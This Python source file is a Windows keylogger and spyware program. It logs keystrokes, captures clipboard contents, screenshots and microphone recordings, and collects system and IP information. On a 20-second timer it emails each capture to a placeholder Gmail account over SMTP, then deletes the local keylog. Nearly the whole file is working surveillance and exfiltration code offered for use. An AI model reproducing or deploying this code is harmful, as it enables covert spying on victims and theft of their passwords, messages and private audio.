'''


'''


from email.mime.multipart import MIMEMultipart
from email.mime.text  import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard 
from pynput.keyboard import Key, Listener #keystroke
import time #to track time
import threading
import os 
import sys
from scipy.io.wavfile import write #for microphone 
import sounddevice as sd # microphone
from cryptography.fernet import Fernet # to encrypt file 
import getpass #to get username 
from requests import get
from multiprocessing import Process , freeze_support #for screenshot for 1 ss at a time
from PIL import ImageGrab 




email_address = "xxxxx@gmail.com"
password = "xxxxxxxx"
toaddr = email_address

microphone_time = 10
audio_info = "audio.wav"
clipboard_info = "clipboard.txt"
system_info = "system.txt"
screenshot_info = "screenshot.png"

key_info = "keylog.txt"
file_path = r"F:\Software\Data Files\"  #Change this file path 
extend = "\\"



def send_email(filename , attach , toaddr):
	fromaddr = email_address
	msg = MIMEMultipart()
	msg['From'] = fromaddr
	msg['To'] = toaddr
	msg['Subject'] = "Log File"
	body = "Body of the email"
	msg.attach(MIMEText(body,'plain'))
	
	filename = filename
	attach = open(attach, 'rb')
	p = MIMEBase('application', 'octet-stream')
	p.set_payload((attach).read())
	encoders.encode_base64(p)
	p.add_header('Content-Disposition', "attachment; filename= %s " % filename) #email header

	msg.attach(p)
	s = smtplib.SMTP("smtp.gmail.com",587)
	s.starttls()
	s.login(email_address,password)
	text = msg.as_string()
	s.sendmail(fromaddr, toaddr, text)
	s.quit()


def host_info():
	with open(file_path+extend+system_info, "a") as f:
		hostname = socket.gethostname()  
		ip = socket.gethostbyname(hostname)
		try:
			pub_ip = get('https://api.ipify.org').text
			f.write("Public ip = "+pub_ip+"\n")
		except Exception:
			f.write("Could not get pub ip"+"\n")
		f.write("Processor Info: "+platform.processor()+"\n")
		f.write("System Info: "+platform.system()+" "+platform.version()+"\n")
		f.write("Machine: "+platform.machine()+"\n")
		f.write("Hostname: "+ hostname + "\n")
		f.write("Private ip: "+ip+"\n\n")


def copy_clipboard():
	with open(file_path+extend+clipboard_info,"w") as f:
		try:
			win32clipboard.OpenClipboard()
			pasted_data = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()

			f.write("ClipBoard Info: \n"+pasted_data+"\n\n")
		except:
			f.write("Clip not text")

def microphone():
	fs = 44100
	second = microphone_time
	myrecording = sd.rec(int(second * fs), samplerate=fs, channels=2)
	sd.wait()
	write(file_path+extend+audio_info, fs, myrecording)

def screenshot():
	im = ImageGrab.grab()
	im.save(file_path+extend+screenshot_info)


def report():
	copy_clipboard()
	send_email(clipboard_info, file_path + extend + clipboard_info, toaddr)

	screenshot()
	send_email(screenshot_info, file_path + extend + screenshot_info, toaddr)
	
	microphone()
	send_email(audio_info, file_path + extend + audio_info, toaddr)

	if os.path.exists(file_path+extend+key_info):
		send_email(key_info, file_path + extend + key_info, toaddr)
		os.remove(file_path+extend+key_info)



	

	timer = threading.Timer(20 , report)
	timer.start()
	



host_info()
send_email(system_info, file_path + extend + system_info, toaddr)


count =0
keys =[]
def on_press(key):
	global keys , count
	try:
		keys.append(str(key.char))
		count += 1
	except AttributeError:
		if key == key.space:
			keys.append(" ")
			count += 1
		elif key == key.enter:
			keys.append("\n")
			count += 1
		else:
			keys.append(" "+str(key)+" ")
			count += 1


	if count >= 1:
		count =0
		write_file(keys)
		keys=[]


def write_file(keys):
	with open(file_path + extend + key_info, "a") as f:
		for key in keys:
			f.write(key)
			f.close()

def on_release(key):
	if key == Key.esc:
		return False




with Listener(on_press=on_press, on_release=on_release) as listener:
	report()
	listener.join()





















